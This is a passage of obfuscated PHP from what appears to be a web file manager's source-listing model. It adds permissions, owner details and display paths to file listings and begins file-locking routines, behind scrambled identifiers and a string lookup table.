$ê®Å¯ã¾ = Model($ğù¦óÔÂ[415])->listData(); $¤¤âçİ = Model($ğù¦óÔÂ[476])->listSimple(); $£ĞÓÏ½ = array_to_keyvalue($¶ÃÙ¬ø, $ğù¦óÔÂ[399]); $É´«™¿Ş = array_to_keyvalue_group($Áşç‚¼, $ğù¦óÔÂ[84], $ğù¦óÔÂ[426]); $ŞÊïç¶¿ = array_to_keyvalue($ê®Å¯ã¾, $ğù¦óÔÂ[84]); $±Ú­ñ¯ = array_to_keyvalue_group($¤¤âçİ, $ğù¦óÔÂ[402]); foreach ($‚¡ÏÂº× as &$ …çµ³•) { $ …çµ³•[$ğù¦óÔÂ[87]] = array($ğù¦óÔÂ[477] => 0, $ğù¦óÔÂ[478] => 0, $ğù¦óÔÂ[479] => 0); if (isset($ŞÊïç¶¿[$ …çµ³•[$ğù¦óÔÂ[402]]])) { $ …çµ³•[$ğù¦óÔÂ[87]][$ğù¦óÔÂ[480]] = 1; $ …çµ³•[$ğù¦óÔÂ[87]][$ğù¦óÔÂ[481]] = $ŞÊïç¶¿[$ …çµ³•[$ğù¦óÔÂ[402]]][$ğù¦óÔÂ[32]]; } if ($É´«™¿Ş && $£ĞÓÏ½ && isset($É´«™¿Ş[$ …çµ³•[$ğù¦óÔÂ[402]]])) { $ …çµ³•[$ğù¦óÔÂ[87]][$ğù¦óÔÂ[482]] = array(); foreach ($É´«™¿Ş[$ …çµ³•[$ğù¦óÔÂ[402]]] as $™è†Ò…) { $Ôëİ¤• = $£ĞÓÏ½[$™è†Ò…]; $ …çµ³•[$ğù¦óÔÂ[87]][$ğù¦óÔÂ[482]][] = array($ğù¦óÔÂ[483] => $Ôëİ¤•[$ğù¦óÔÂ[399]], $ğù¦óÔÂ[420] => $Ôëİ¤•[$ğù¦óÔÂ[32]], $ğù¦óÔÂ[484] => $Ôëİ¤•[$ğù¦óÔÂ[485]]); } } if ($±Ú­ñ¯ && isset($±Ú­ñ¯[$ …çµ³•[$ğù¦óÔÂ[402]]])) { $ …çµ³•[$ğù¦óÔÂ[87]][$ğù¦óÔÂ[486]] = array(); foreach ($±Ú­ñ¯[$ …çµ³•[$ğù¦óÔÂ[402]]] as $«Ïò¢ì) { $¡àÓúæ = $ğù¦óÔÂ[487]; if ($«Ïò¢ì[$ğù¦óÔÂ[488]] == $ğù¦óÔÂ[88]) { $¡àÓúæ .= $ğù¦óÔÂ[489]; } $ …çµ³•[$ğù¦óÔÂ[87]][$ğù¦óÔÂ[486]] = array_field_key($«Ïò¢ì, explode($ğù¦óÔÂ[50], $¡àÓúæ)); } } } unset($ …çµ³•); return $‚¡ÏÂº×; } protected function _listAppendChildren(&$âüßıò, $Ì·ìö¼‡) { $ìÖÅ“ªÁ =& $_SERVER[ì™ı‰º¯]; $«Ï‘ò¿› = array(); $ÓÑòãÎÈ = array($ìÖÅ“ªÁ[207] => 0, $ìÖÅ“ªÁ[208] => 0); foreach ($âüßıò as &$ö²ëÊÁ) { if (!$ö²ëÊÁ[$ìÖÅ“ªÁ[410]]) { continue; } $«Ï‘ò¿›[] = $ö²ëÊÁ[$ìÖÅ“ªÁ[402]]; } unset($ö²ëÊÁ); if (!$«Ï‘ò¿›) { return; } $—×‚Ñª = array($ìÖÅ“ªÁ[432] => array($ìÖÅ“ªÁ[7], $«Ï‘ò¿›), $ìÖÅ“ªÁ[431] => 0); $æˆƒ¦€ƒ = array($ìÖÅ“ªÁ[432], $ìÖÅ“ªÁ[410], $ìÖÅ“ªÁ[490] => $ìÖÅ“ªÁ[491]); $›²¿ğëù = $this->field($æˆƒ¦€ƒ)->where($—×‚Ñª)->group($ìÖÅ“ªÁ[492])->select(); $àŞÈÙê³ = array(); foreach ($›²¿ğëù as $°äÊ‹ªğ) { $óìÇßœ™ = $°äÊ‹ªğ[$ìÖÅ“ªÁ[432]]; $×’õ‡Ô£ = $°äÊ‹ªğ[$ìÖÅ“ªÁ[410]] == $ìÖÅ“ªÁ[88] ? $ìÖÅ“ªÁ[208] : $ìÖÅ“ªÁ[207]; if (!isset($àŞÈÙê³[$óìÇßœ™])) { $àŞÈÙê³[$óìÇßœ™] = array($ìÖÅ“ªÁ[207] => 0, $ìÖÅ“ªÁ[208] => 0); } $àŞÈÙê³[$óìÇßœ™][$×’õ‡Ô£] += $°äÊ‹ªğ[$ìÖÅ“ªÁ[491]]; } foreach ($âüßıò as &$ö²ëÊÁ) { if (!$ö²ëÊÁ[$ìÖÅ“ªÁ[410]]) { continue; } $·ı†‹ = is_array($àŞÈÙê³[$ö²ëÊÁ[$ìÖÅ“ªÁ[402]]]) ? $àŞÈÙê³[$ö²ëÊÁ[$ìÖÅ“ªÁ[402]]] : $ÓÑòãÎÈ; $ö²ëÊÁ[$ìÖÅ“ªÁ[208]] = $·ı†‹[$ìÖÅ“ªÁ[208]]; $ö²ëÊÁ[$ìÖÅ“ªÁ[207]] = $·ı†‹[$ìÖÅ“ªÁ[207]]; unset($ö²ëÊÁ[$ìÖÅ“ªÁ[412]]); } unset($ö²ëÊÁ); } protected function _listAppendAuth(&$–½ˆ‚Ô¶) { $ƒ†óºòÆ =& $_SERVER[ì™ı‰º¯]; $Áò‚ŒëË = array(); foreach ($–½ˆ‚Ô¶ as $Í˜áõæ») { if ($Í˜áõæ»[$ƒ†óºòÆ[411]] == self::TYPE_GROUP) { $Áò‚ŒëË[] = $Í˜áõæ»[$ƒ†óºòÆ[402]]; } } if (!$Áò‚ŒëË) { return; } $ıë¨¾ù´ = array_to_keyvalue($–½ˆ‚Ô¶, $ƒ†óºòÆ[402]); $şµ®¡ğ = Model($ƒ†óºòÆ[493])->getSourceList($Áò‚ŒëË, $ıë¨¾ù´); $ŸÌ¸—ış = $GLOBALS[$ƒ†óºòÆ[494]] == 1; foreach ($–½ˆ‚Ô¶ as $§Üè”µ => &$Í˜áõæ») { $Í˜áõæ»[$ƒ†óºòÆ[413]] = $şµ®¡ğ[$Í˜áõæ»[$ƒ†óºòÆ[402]]]; if (!$Í˜áõæ»[$ƒ†óºòÆ[413]] && $Í˜áõæ»[$ƒ†óºòÆ[411]] == self::TYPE_GROUP) { $Í˜áõæ»[$ƒ†óºòÆ[413]] = Action($ƒ†óºòÆ[495])->pathGroupAuthMake($Í˜áõæ»[$ƒ†óºòÆ[496]]); if (!$Í˜áõæ»[$ƒ†óºòÆ[413]] && !$ŸÌ¸—ış) { $Í˜áõæ»[$ƒ†óºòÆ[203]] = !1; $Í˜áõæ»[$ƒ†óºòÆ[202]] = !1; } } if ($Í˜áõæ»[$ƒ†óºòÆ[413]]) { $Í˜áõæ»[$ƒ†óºòÆ[203]] = AuthModel::authCheckEdit($Í˜áõæ»[$ƒ†óºòÆ[413]][$ƒ†óºòÆ[414]]); $Í˜áõæ»[$ƒ†óºòÆ[202]] = AuthModel::authCheckView($Í˜áõæ»[$ƒ†óºòÆ[413]][$ƒ†óºòÆ[414]]); } $this->groupPathDisplay($Í˜áõæ»); } unset($Í˜áõæ»); } public function _listAppendAuthSecret(&$æ³å¥’Ä) { $é‹ö–¯Å =& $_SERVER[ì™ı‰º¯]; if (Model($é‹ö–¯Å[435])->get($é‹ö–¯Å[497]) != $é‹ö–¯Å[88]) { return; } static $ó¬„Ÿ¡¹ = false; if (!$ó¬„Ÿ¡¹) { $Æ¬¢Õı = Model($é‹ö–¯Å[498]); $¯ÒàÍ‰ = Model($é‹ö–¯Å[499]); $ó¬„Ÿ¡¹ = $¯ÒàÍ‰->listData(); $ó¬„Ÿ¡¹ = array_to_keyvalue($ó¬„Ÿ¡¹, $é‹ö–¯Å[402]); $ğ›”Ü¥× = json_decode(Model($é‹ö–¯Å[435])->get($é‹ö–¯Å[500]), !0); $ğ›”Ü¥× = array_to_keyvalue($ğ›”Ü¥×, $é‹ö–¯Å[399]); foreach ($ó¬„Ÿ¡¹ as $¬˜Õ§Ô‰ => $•Í—øÉè) { $âÇíë‡× = $ğ›”Ü¥×[$•Í—øÉè[$é‹ö–¯Å[501]]]; if (!$âÇíë‡×) { $¯ÒàÍ‰->remove($•Í—øÉè[$é‹ö–¯Å[399]]); unset($ó¬„Ÿ¡¹[$¬˜Õ§Ô‰]); continue; } $™ì†ö«„ = $Æ¬¢Õı->listData($âÇíë‡×[$é‹ö–¯Å[413]]); if (!$™ì†ö«„) { $¯ÒàÍ‰->remove($•Í—øÉè[$é‹ö–¯Å[399]]); unset($ó¬„Ÿ¡¹[$¬˜Õ§Ô‰]); continue; } $•Í—øÉè[$é‹ö–¯Å[413]] = $™ì†ö«„; $•Í—øÉè[$é‹ö–¯Å[502]] = $âÇíë‡×; $•Í—øÉè[$é‹ö–¯Å[503]] = Model($é‹ö–¯Å[504])->getInfoSimpleOuter($•Í—øÉè[$é‹ö–¯Å[454]]); $ó¬„Ÿ¡¹[$¬˜Õ§Ô‰] = $•Í—øÉè; } } $İ‰óıÎÇ = USER_ID; $Ã‹†ÆÀ = array(); $°œ‚¡­ = $this->_listAppendPath($Ã‹†ÆÀ, !0); foreach ($æ³å¥’Ä as $¬˜Õ§Ô‰ => &$•Í—øÉè) { if (!is_array($•Í—øÉè[$é‹ö–¯Å[413]])) { continue; } if ($•Í—øÉè[$é‹ö–¯Å[411]] != $é‹ö–¯Å[505]) { continue; } if (isset($ó¬„Ÿ¡¹[$•Í—øÉè[$é‹ö–¯Å[402]]])) { $§ñ²éèì = $ó¬„Ÿ¡¹[$•Í—øÉè[$é‹ö–¯Å[402]]]; if (!is_array($•Í—øÉè[$é‹ö–¯Å[466]])) { $•Í—øÉè[$é‹ö–¯Å[466]] = array(); } $•Í—øÉè[$é‹ö–¯Å[466]][$é‹ö–¯Å[506]] = $§ñ²éèì[$é‹ö–¯Å[501]]; $•Í—øÉè[$é‹ö–¯Å[413]][$é‹ö–¯Å[507]] = $§ñ²éèì; $•Í—øÉè[$é‹ö–¯Å[413]][$é‹ö–¯Å[508]] = $•Í—øÉè[$é‹ö–¯Å[509]]; $•Í—øÉè[$é‹ö–¯Å[413]][$é‹ö–¯Å[510]] = $é‹ö–¯Å[88]; if ($§ñ²éèì[$é‹ö–¯Å[454]] != $İ‰óıÎÇ) { $•Í—øÉè[$é‹ö–¯Å[413]][$é‹ö–¯Å[414]] = $•Í—øÉè[$é‹ö–¯Å[413]][$é‹ö–¯Å[414]] & $§ñ²éèì[$é‹ö–¯Å[413]][$é‹ö–¯Å[413]]; } continue; } $Áõ‹ô¾÷ = $this->parentLevelArray($•Í—øÉè[$é‹ö–¯Å[511]]); $ñÀşÔïÙ = array_reverse($Áõ‹ô¾÷); foreach ($ñÀşÔïÙ as $Ïº¹¾‡Æ => $¢¥®šÉ) { if (!isset($ó¬„Ÿ¡¹[$¢¥®šÉ])) { continue; } $§ñ²éèì = $ó¬„Ÿ¡¹[$¢¥®šÉ]; $•Í—øÉè[$é‹ö–¯Å[413]][$é‹ö–¯Å[507]] = $§ñ²éèì; if ($§ñ²éèì[$é‹ö–¯Å[454]] != $İ‰óıÎÇ) { $•Í—øÉè[$é‹ö–¯Å[413]][$é‹ö–¯Å[414]] = $•Í—øÉè[$é‹ö–¯Å[413]][$é‹ö–¯Å[414]] & $§ñ²éèì[$é‹ö–¯Å[413]][$é‹ö–¯Å[413]]; } $ìÒúÜÄŠ = $é‹ö–¯Å[12]; $¡Ò÷ó€ = count($Áõ‹ô¾÷) - $Ïº¹¾‡Æ; for ($¸íÔƒ·» = 0; $¸íÔƒ·» < $¡Ò÷ó€; $¸íÔƒ·»++) { if (!isset($°œ‚¡­[$Áõ‹ô¾÷[$¸íÔƒ·»]])) { $ìÒúÜÄŠ = $é‹ö–¯Å[12]; break; } $ìÒúÜÄŠ = $ìÒúÜÄŠ . rtrim($°œ‚¡­[$Áõ‹ô¾÷[$¸íÔƒ·»]], $é‹ö–¯Å[8]) . $é‹ö–¯Å[8]; } $•Í—øÉè[$é‹ö–¯Å[413]][$é‹ö–¯Å[508]] = rtrim($ìÒúÜÄŠ, $é‹ö–¯Å[8]) . $é‹ö–¯Å[8]; break; } } unset($•Í—øÉè); } public function groupPathDisplay(&$“ªà÷êÈ) { $‡ªËÆùô =& $_SERVER[ì™ı‰º¯]; if ($“ªà÷êÈ[$‡ªËÆùô[411]] != self::TYPE_GROUP) { return; } $ÁÇŒ·²¡ = Model($‡ªËÆùô[512])->getInfo($“ªà÷êÈ[$‡ªËÆùô[496]]); $ğƒ³ÁÀ = $this->parentLevelArray($ÁÇŒ·²¡[$‡ªËÆùô[511]]); $Ãš‹‘¿‹ = $‡ªËÆùô[12]; foreach ($ğƒ³ÁÀ as $Ç€İƒï) { $¡€èûß = Model($‡ªËÆùô[512])->getInfo($Ç€İƒï); $Ãš‹‘¿‹ .= $¡€èûß[$‡ªËÆùô[87]][$‡ªËÆùô[402]] . $‡ªËÆùô[50]; } $“ªà÷êÈ[$‡ªËÆùô[513]] = $ÁÇŒ·²¡[$‡ªËÆùô[432]]; $“ªà÷êÈ[$‡ªËÆùô[514]] = $ÁÇŒ·²¡[$‡ªËÆùô[511]]; $“ªà÷êÈ[$‡ªËÆùô[515]] = $ÁÇŒ·²¡[$‡ªËÆùô[516]]; $“ªà÷êÈ[$‡ªËÆùô[517]] = $Ãš‹‘¿‹ . $ÁÇŒ·²¡[$‡ªËÆùô[87]][$‡ªËÆùô[402]]; } protected function _listAppendPath(&$™ÆÏ÷…‡, $“¾úÈÖ = false) { $Îùó„³­ =& $_SERVER[ì™ı‰º¯]; static $¿Ö¢Šœ’ = array(); $‹·³Ğ¼ = array(); $¥£¼õÈ¹ = array(); if ($“¾úÈÖ) { return $¿Ö¢Šœ’; } foreach ($™ÆÏ÷…‡ as &$„„³ÉÔ) { $ÛìƒÍñ„ = $„„³ÉÔ[$Îùó„³­[402]]; if ($„„³ÉÔ[$Îùó„³­[410]] == $Îùó„³­[88] && $„„³ÉÔ[$Îùó„³­[432]] != 0) { $¿Ö¢Šœ’[$ÛìƒÍñ„] = $„„³ÉÔ[$Îùó„³­[32]]; } if ($„„³ÉÔ[$Îùó„³­[410]] == $Îùó„³­[88] && $„„³ÉÔ[$Îùó„³­[432]] == 0 && !isset($¿Ö¢Šœ’[$ÛìƒÍñ„])) { $¿Ö¢Šœ’[$ÛìƒÍñ„] = $this->_listAppendPathRoot($„„³ÉÔ, array()); } if (isset($¥£¼õÈ¹[$„„³ÉÔ[$Îùó„³­[511]]])) { continue; } $¥£¼õÈ¹[$„„³ÉÔ[$Îùó„³­[511]]] = !0; $Ş‘Ÿó¬ = $this->parentLevelArray($„„³ÉÔ[$Îùó„³­[511]]); foreach ($Ş‘Ÿó¬ as $ƒ€ÄÄÁ => $°îœ¤ŞÇ) { if (isset($¿Ö¢Šœ’[$°îœ¤ŞÇ])) { continue; } if ($ƒ€ÄÄÁ == 0) { $¿Ö¢Šœ’[$°îœ¤ŞÇ] = $this->_listAppendPathRoot($„„³ÉÔ, $Ş‘Ÿó¬); } if ($ƒ€ÄÄÁ != 0) { $‹·³Ğ¼[] = $°îœ¤ŞÇ; } } } unset($„„³ÉÔ); $‹·³Ğ¼ = array_unique($‹·³Ğ¼); if (count($‹·³Ğ¼) > 0) { $×’°şÃ = array($Îùó„³­[417] => array($Îùó„³­[418], $‹·³Ğ¼)); if (count($‹·³Ğ¼) == 1) { $İÛŞé‡ = $this->sourceInfo($‹·³Ğ¼[0]); $¶î†«¤™ = is_array($İÛŞé‡) ? array($İÛŞé‡) : !1; } else { $¶î†«¤™ = $this->field($Îùó„³­[518])->where($×’°şÃ)->select(); } if (!$¶î†«¤™) { $¶î†«¤™ = array(); } foreach ($¶î†«¤™ as $é»¹ï…) { $¿Ö¢Šœ’[$é»¹ï…[$Îùó„³­[402]]] = $é»¹ï…[$Îùó„³­[32]]; } } $„ßîíÙ× = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ëüí÷‰ = array(); foreach ($™ÆÏ÷…‡ as &$„„³ÉÔ) { $„ìªÄ†š = $„„³ÉÔ[$Îùó„³­[511]]; $ÄÁ‰ç = $Îùó„³­[12]; if (isset($ëüí÷‰[$„ìªÄ†š])) { $ÄÁ‰ç = $ëüí÷‰[$„ìªÄ†š]; } else { $Ş‘Ÿó¬ = $this->parentLevelArray($„„³ÉÔ[$Îùó„³­[511]]); foreach ($Ş‘Ÿó¬ as $ƒ€ÄÄÁ => $°îœ¤ŞÇ) { if (isset($¿Ö¢Šœ’[$°îœ¤ŞÇ])) { $ÄÁ‰ç .= $¿Ö¢Šœ’[$°îœ¤ŞÇ] . $Îùó„³­[8]; } } $ëüí÷‰[$„ìªÄ†š] = $ÄÁ‰ç; } $ÄÁ‰ç .= $„„³ÉÔ[$Îùó„³­[32]]; if ($„„³ÉÔ[$Îùó„³­[410]] == $Îùó„³­[88]) { $ÄÁ‰ç .= $Îùó„³­[8]; } $„„³ÉÔ[$Îùó„³­[509]] = str_replace($Îùó„³­[519], $Îùó„³­[8], $ÄÁ‰ç); if ($„„³ÉÔ[$Îùó„³­[432]] == $Îùó„³­[198]) { $„„³ÉÔ[$Îùó„³­[32]] = trim($¿Ö¢Šœ’[$„„³ÉÔ[$Îùó„³­[402]]], $Îùó„³­[8]); $„„³ÉÔ[$Îùó„³­[509]] = $„„³ÉÔ[$Îùó„³­[32]] . $Îùó„³­[8]; } if (intval($„„³ÉÔ[$Îùó„³­[411]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($„„³ÉÔ, $Ş‘Ÿó¬, $„ßîíÙ×); } } unset($„„³ÉÔ); return $™ÆÏ÷…‡; } private function _listAppendPathRecycle(&$¼Ÿ’…ã™, $Ïà³¸şÎ, $†—¥ĞÛ) { $ÒÔˆÈëÂ =& $_SERVER[ì™ı‰º¯]; if (!in_array($†—¥ĞÛ, $Ïà³¸şÎ) && $¼Ÿ’…ã™[$ÒÔˆÈëÂ[402]] != $†—¥ĞÛ) { return; } $×“ÄˆÒ = explode($ÒÔˆÈëÂ[8], trim($¼Ÿ’…ã™[$ÒÔˆÈëÂ[509]], $ÒÔˆÈëÂ[8])); $ŒÒÈØŠ = implode($ÒÔˆÈëÂ[8], array_slice($×“ÄˆÒ, 2)); $¼Ÿ’…ã™[$ÒÔˆÈëÂ[509]] = $ÒÔˆÈëÂ[8] . LNG($ÒÔˆÈëÂ[520]) . $ÒÔˆÈëÂ[8] . ltrim($ŒÒÈØŠ, $ÒÔˆÈëÂ[8]); $¼Ÿ’…ã™[$ÒÔˆÈëÂ[511]] = $ÒÔˆÈëÂ[521] . implode($ÒÔˆÈëÂ[50], array_slice($Ïà³¸şÎ, 1)) . $ÒÔˆÈëÂ[50]; if ($¼Ÿ’…ã™[$ÒÔˆÈëÂ[402]] == $†—¥ĞÛ) { $¼Ÿ’…ã™[$ÒÔˆÈëÂ[511]] = $ÒÔˆÈëÂ[521]; $¼Ÿ’…ã™[$ÒÔˆÈëÂ[432]] = $ÒÔˆÈëÂ[198]; $¼Ÿ’…ã™[$ÒÔˆÈëÂ[32]] = LNG($ÒÔˆÈëÂ[520]); } $¼Ÿ’…ã™[$ÒÔˆÈëÂ[522]] = $ÒÔˆÈëÂ[523]; } protected function _listAppendPathRoot(&$°üŠÏğ˜, $Ù‰ÖÃšü) { $ˆ¦›­¤ =& $_SERVER[ì™ı‰º¯]; static $èãæúª” = false; $›ƒ€û§£ = $ˆ¦›­¤[12]; if ($°üŠÏğ˜[$ˆ¦›­¤[411]] == self::TYPE_USER) { if ($°üŠÏğ˜[$ˆ¦›­¤[496]] == USER_ID) { $›ƒ€û§£ = LNG($ˆ¦›­¤[524]); if ($èãæúª” === !1) { $—“İÖÑ = Model($ˆ¦›­¤[525])->getInfoFull(USER_ID); $èãæúª” = _get($—“İÖÑ, $ˆ¦›­¤[526], $ˆ¦›­¤[12]); } if ($Ù‰ÖÃšü && $Ù‰ÖÃšü[0] == $èãæúª” || !$Ù‰ÖÃšü && $°üŠÏğ˜[$ˆ¦›­¤[402]] == $èãæúª”) { $›ƒ€û§£ = LNG($ˆ¦›­¤[527]); $°üŠÏğ˜[$ˆ¦›­¤[528]] = $ˆ¦›­¤[529]; } if (!$Ù‰ÖÃšü) { $°üŠÏğ˜[$ˆ¦›­¤[32]] = $›ƒ€û§£; } } else { $ÈËâÛ˜¤ = Model($ˆ¦›­¤[504])->getInfoSimple($°üŠÏğ˜[$ˆ¦›­¤[496]]); $›ƒ€û§£ = LNG($ˆ¦›­¤[530]) . $ˆ¦›­¤[162] . $ÈËâÛ˜¤[$ˆ¦›­¤[32]] . $ˆ¦›­¤[164]; $°üŠÏğ˜[$ˆ¦›­¤[531]] = array($ˆ¦›­¤[32] => $ÈËâÛ˜¤[$ˆ¦›­¤[32]], $ˆ¦›­¤[532] => $ÈËâÛ˜¤[$ˆ¦›­¤[532]], $ˆ¦›­¤[533] => $ÈËâÛ˜¤[$ˆ¦›­¤[533]]); } } else { if ($°üŠÏğ˜[$ˆ¦›­¤[411]] == self::TYPE_GROUP) { $ÈËâÛ˜¤ = Model($ˆ¦›­¤[512])->getInfoSimple($°üŠÏğ˜[$ˆ¦›­¤[496]]); $›ƒ€û§£ = $ÈËâÛ˜¤[$ˆ¦›­¤[32]]; } else { if ($°üŠÏğ˜[$ˆ¦›­¤[411]] == self::TYPE_SYSTEM) { $›ƒ€û§£ = $ˆ¦›­¤[534]; } } } $›ƒ€û§£ = $›ƒ€û§£ ? $ˆ¦›­¤[8] . $›ƒ€û§£ . $ˆ¦›­¤[8] : $ˆ¦›­¤[8]; return $›ƒ€û§£; } protected function _listAppendUser(&$ì ¤à•Û) { $—ıáÃ–Š =& $_SERVER[ì™ı‰º¯]; $¶–Ãõò = array_to_keyvalue($ì ¤à•Û, $—ıáÃ–Š[12], $—ıáÃ–Š[454]); $¸†‘©”õ = array_to_keyvalue($ì ¤à•Û, $—ıáÃ–Š[12], $—ıáÃ–Š[456]); $‚î˜Ô¥° = array_merge($¶–Ãõò, $¸†‘©”õ); $¥´İÌä = Model($—ıáÃ–Š[525])->userListInfo($‚î˜Ô¥°); foreach ($ì ¤à•Û as &$¼æ‚Ê”¼) { $òÜá­»Ö = $¼æ‚Ê”¼[$—ıáÃ–Š[454]]; $¼æ‚Ê”¼[$—ıáÃ–Š[454]] = $¥´İÌä[$òÜá­»Ö] ? $¥´İÌä[$òÜá­»Ö] : !1; $òÜá­»Ö = $¼æ‚Ê”¼[$—ıáÃ–Š[456]]; $¼æ‚Ê”¼[$—ıáÃ–Š[456]] = $¥´İÌä[$òÜá­»Ö] ? $¥´İÌä[$òÜá­»Ö] : !1; if (isset($¼æ‚Ê”¼[$—ıáÃ–Š[466]]) && $¼æ‚Ê”¼[$—ıáÃ–Š[466]][$—ıáÃ–Š[535]]) { $¬´ÆüˆÀ = $GLOBALS[$—ıáÃ–Š[6]][$—ıáÃ–Š[89]][$—ıáÃ–Š[536]]; if ($¼æ‚Ê”¼[$—ıáÃ–Š[466]][$—ıáÃ–Š[537]] <= time() - $¬´ÆüˆÀ) { $this->metaSet($¼æ‚Ê”¼[$—ıáÃ–Š[402]], $—ıáÃ–Š[535], null); $this->metaSet($¼æ‚Ê”¼[$—ıáÃ–Š[402]], $—ıáÃ–Š[537], null); unset($¼æ‚Ê”¼[$—ıáÃ–Š[466]][$—ıáÃ–Š[535]]); continue; } $ÄâÏïş¼ = $¼æ‚Ê”¼[$—ıáÃ–Š[466]][$—ıáÃ–Š[535]]; $¼æ‚Ê”¼[$—ıáÃ–Š[466]][$—ıáÃ–Š[538]] = Model($—ıáÃ–Š[525])->getInfoSimpleOuter($ÄâÏïş¼); } } unset($¼æ‚Ê”¼); } public function parentLevelArray($Ô»èâ½û) { $¶ÅĞÑ©ª =& $_SERVER[ì™ı‰º¯]; $Ô»èâ½û = explode($¶ÅĞÑ©ª[50], trim($Ô»èâ½û, $¶ÅĞÑ©ª[50])); return array_remove_value($Ô»èâ½û, $¶ÅĞÑ©ª[198]); } public function listAll($½µÜ³Ê¶) { $­Êğ•‰© =& $_SERVER[ì™ı‰º¯]; $ Åş‡€¬ = $this->sourceInfo($½µÜ³Ê¶); $Ç¼È¨Óê = array($­Êğ•‰©[539] => array($­Êğ•‰©[540], $ Åş‡€¬[$­Êğ•‰©[511]] . $½µÜ³Ê¶ . $­Êğ•‰©[541]), $­Êğ•‰©[542] => 0); $‹ÖÂÌè’ = $­Êğ•‰©[543]; $ûüÜ÷¤Ñ = "\x4c\x45\x46\124\x20\x4a\117\x49\x4e\x20{$this->tablePrefix}\x69\157\x5f\x66\151\x6c\x65\40\146\x69\x6c\x65\x20\157\x6e\x20\x73\157\x75\162\x63\x65\56\x66\x69\x6c\145\x49\104\x20\x3d\x20\x66\151\154\x65\x2e\x66\x69\x6c\x65\x49\x44"; $Ù‚¸ìı = $this->alias($­Êğ•‰©[446])->field($‹ÖÂÌè’)->where($Ç¼È¨Óê)->join($ûüÜ÷¤Ñ)->select(); $this->_listAppendAuth($Ù‚¸ìı); $this->_listAppendUser($Ù‚¸ìı); $this->_listAppendPath($Ù‚¸ìı); $Ù‚¸ìı = array_to_keyvalue($Ù‚¸ìı, $­Êğ•‰©[402]); $ß†‘•–Ñ = "\57{$ Åş‡€¬[$­Êğ•‰©[32]]}\57"; $ß†‘•–Ñ = $ß†‘•–Ñ == $­Êğ•‰©[519] ? $­Êğ•‰©[8] : $ß†‘•–Ñ; $³¯‡¥¶„ = array(); foreach ($Ù‚¸ìı as $’¹ô‚à => $ªõ™“Ûì) { $±ö²Ôâ¶ = $this->parentLevelArray($ªõ™“Ûì[$­Êğ•‰©[511]]); array_shift($±ö²Ôâ¶); $¥£İ¶™£ = $ß†‘•–Ñ; for ($ü¶øüª‹ = 0; $ü¶øüª‹ < count($±ö²Ôâ¶); $ü¶øüª‹++) { $¥£İ¶™£ .= $Ù‚¸ìı[$±ö²Ôâ¶[$ü¶øüª‹]][$­Êğ•‰©[32]] . $­Êğ•‰©[8]; } $¥£İ¶™£ .= $ªõ™“Ûì[$­Êğ•‰©[32]]; if ($ªõ™“Ûì[$­Êğ•‰©[410]]) { $¥£İ¶™£ .= $­Êğ•‰©[8]; } $Š˜İÈÍò = array($­Êğ•‰©[421] => str_replace($­Êğ•‰©[519], $­Êğ•‰©[8], str_replace($­Êğ•‰©[519], $­Êğ•‰©[8], str_replace($­Êğ•‰©[519], $­Êğ•‰©[8], $¥£İ¶™£))), $­Êğ•‰©[544] => intval($ªõ™“Ûì[$­Êğ•‰©[410]]), $­Êğ•‰©[545] => intval($ªõ™“Ûì[$­Êğ•‰©[76]]), $­Êğ•‰©[85] => intval($ªõ™“Ûì[$­Êğ•‰©[85]]), $­Êğ•‰©[87] => $this->pathInfoFilter($ªõ™“Ûì)); if (!$Š˜İÈÍò[$­Êğ•‰©[410]]) { $Š˜İÈÍò[$­Êğ•‰©[468]] = $ªõ™“Ûì[$­Êğ•‰©[468]]; } $³¯‡¥¶„[] = $Š˜İÈÍò; } $³¯‡¥¶„ = array_sort_by($³¯‡¥¶„, $­Êğ•‰©[84]); return $³¯‡¥¶„; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($û¿×ä‡€) { $¿‰šù =& $_SERVER[ì™ı‰º¯]; if (!$this->allowLock()) { return; } $this->_lockCheck($¿‰šù[546], $û¿×ä‡€); $ÇèÑñ¤³ = 1; $this->_lockEvent($û¿×ä‡€, array($¿‰šù[547], $¿‰šù[548]), $ÇèÑñ¤³); $this->_lockParent($û¿×ä‡€, array($¿‰šù[548]), $ÇèÑñ¤³); $this->_lockEvent($û¿×ä‡€, array($¿‰šù[549], $¿‰šù[550]), $ÇèÑñ¤³); $this->_lockCheckEnd($¿‰šù[546], $û¿×ä‡€); } public function lockCopyEnd($¡ ±ğ¬É) { $¥Â¿É‰Ó =& $_SERVER[ì™ı‰º¯]; if (!$this->allowLock()) { return; } $Ö¡ÓŒöß = 0; $this->_lockEvent($¡ ±ğ¬É, array($¥Â¿É‰Ó[547], $¥Â¿É‰Ó[548]), $Ö¡ÓŒöß); $this->_lockParent($¡ ±ğ¬É, array($¥Â¿É‰Ó[548]), $Ö¡ÓŒöß); $this->_lockEvent($¡ ±ğ¬É, array($¥Â¿É‰Ó[549], $¥Â¿É‰Ó[550]), $Ö¡ÓŒöß); } public function lockWriteStart($šáûÔ™§, $Î•œí¼¤ = '') { $øëé¹ƒ =& $_SERVER[ì™ı‰º¯]; if (!$this->allowLock()) { return; } $this->_lockCheck($øëé¹ƒ[547], $šáûÔ™§); $®ÉÛø‡ı = 1; $this->_lockKey($øëé¹ƒ[551] . $šáûÔ™§ . $øëé¹ƒ[10] . $Î•œí¼¤, $®ÉÛø‡ı); $this->_lockEvent($šáûÔ™§, array($øëé¹ƒ[546], $øëé¹ƒ[548]), $®ÉÛø‡ı); $this->_lockParent($šáûÔ™§, array($øëé¹ƒ[546], $øëé¹ƒ[548]), $®ÉÛø‡ı); $this->_lockCheckEnd($øëé¹ƒ[547], $šáûÔ™§); } public function lockWriteEnd($Ã‰††ã, $¼â‘üûÍ = '') { $¿ŠœÚìâ =& $_SERVER[ì™ı‰º¯]; if (!$this->allowLock()) { return; } $—åÈÙşÎ = 0; $this->_lockKey($¿ŠœÚìâ[551] . $Ã‰††ã . $¿ŠœÚìâ[10] . $¼â‘üûÍ, $—åÈÙşÎ); $this->_lockEvent($Ã‰††ã, array($¿ŠœÚìâ[546], $¿ŠœÚìâ[548]), $—åÈÙşÎ); $this->_lockParent($Ã‰††ã, array($¿ŠœÚìâ[546], $¿ŠœÚìâ[548]), $—åÈÙşÎ); } public function lockMoveStart($Ÿšñ¹ŸØ) { $Øé„îÇ¹ =& $_SERVER[ì™ı‰º¯]; if (!$this->allowLock()) { return; } 